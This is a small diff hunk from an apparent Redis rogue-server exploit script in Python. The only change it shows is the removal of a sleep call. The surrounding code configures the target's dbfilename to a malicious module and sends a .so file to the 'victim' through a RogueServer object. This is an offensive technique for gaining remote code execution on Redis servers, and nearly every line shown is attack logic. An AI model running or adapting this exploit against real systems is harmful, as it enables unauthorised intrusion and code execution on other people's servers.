@@ -136,7 +136,6 @@ def runserver(rhost, rport, passwd, lhost, lport, bind_addr):
     remote.do("CONFIG SET dbfilename {}".format(eval_module))
 
     # rend .so to victim
-    sleep(1)
     rogue = RogueServer(bind_addr, lport)
     rogue.exp()
     sleep(1)
